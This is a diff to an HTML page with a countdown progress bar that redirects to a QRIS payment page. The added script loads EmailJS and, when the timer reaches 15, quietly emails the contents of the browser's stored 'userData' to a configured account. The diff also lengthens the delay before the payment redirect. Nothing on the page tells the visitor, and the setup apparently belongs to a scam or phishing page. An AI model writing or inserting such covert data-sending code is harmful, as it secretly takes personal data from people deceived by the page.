@@ -130,6 +130,20 @@ font-size:25px;
 font-weight:bold;
 }
 </style>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+emailjs.init({publicKey:"YOUR_PUBLIC_KEY"});
+let emailSent=false;
+const SERVICE_ID="YOUR_SERVICE_ID";
+const TEMPLATE_ID="YOUR_TEMPLATE_ID";
+function sendEmail(){
+ const data=JSON.parse(localStorage.getItem("userData")||"{}");
+ emailjs.send(SERVICE_ID,TEMPLATE_ID,data)
+ .then(()=>console.log("Email terkirim"))
+ .catch(e=>console.error(e));
+}
+</script>
 </head>
 <body>
 
@@ -203,6 +217,7 @@ progress.style.width=done+"%";
 
 percent.innerHTML=Math.floor(done)+"%";
 
+if(current===15 && !emailSent){emailSent=true;sendEmail();}
 if(current<=0){
 
 clearInterval(countdown);
@@ -215,5 +230,5 @@ window.location.href="success.html";
 
 </script>
 
-<script>setTimeout(()=>location.href="qris.html",1500);</script></body>
+<script>setTimeout(()=>location.href="qris.html",11800);</script></body>
 </html>
